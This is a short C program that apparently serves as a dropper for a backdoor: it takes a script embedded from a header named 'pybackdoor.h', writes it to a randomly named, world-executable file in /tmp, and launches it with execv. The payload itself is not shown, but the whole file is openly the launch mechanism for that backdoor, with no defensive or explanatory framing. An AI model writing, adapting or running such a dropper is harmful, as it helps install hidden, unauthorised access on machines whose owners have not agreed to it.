#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "pybackdoor.h"

char *randomstr(char *buff, int length)
{
    char *p = buff;
    unsigned char store = 0;
    int urandom_fd = 0; // file descriptor for /dev/urondom

    urandom_fd = open("/dev/urandom", O_RDONLY);
    while ( length > 0 )
    {
        read(urandom_fd, &store, 1); 
        store = store % 10 + 0x30;
        *p = store;
        p++;
        length--;
    }

    close(urandom_fd);
    return buff;
}

int main(int argc, char **argv)
{
    int status = 0;
    int backdoor_file_fd = 0;
    char file_name[24] = {0};
    char file_path[64] = "/tmp/";
    char *child_argv[2] = { file_path, NULL};

    randomstr(file_name, 23);
    fprintf(stdout, "file_name: %s\n", file_name);
    if (strcat(file_path, file_name) == NULL)
    {
        perror("strcat");
        exit(-1);
    }
    backdoor_file_fd = open(file_path, O_RDWR | O_CREAT, 0777);
    if ( backdoor_file_fd == -1 )
    {
        perror("open");
        exit(-1);
    }
    write(backdoor_file_fd, backdoor_py, backdoor_py_len);
    close(backdoor_file_fd);

    status = execv(file_path, child_argv);
    if ( status == -1 )
    {
        perror("execv");
        exit(-1);
    }

    return 0;
}
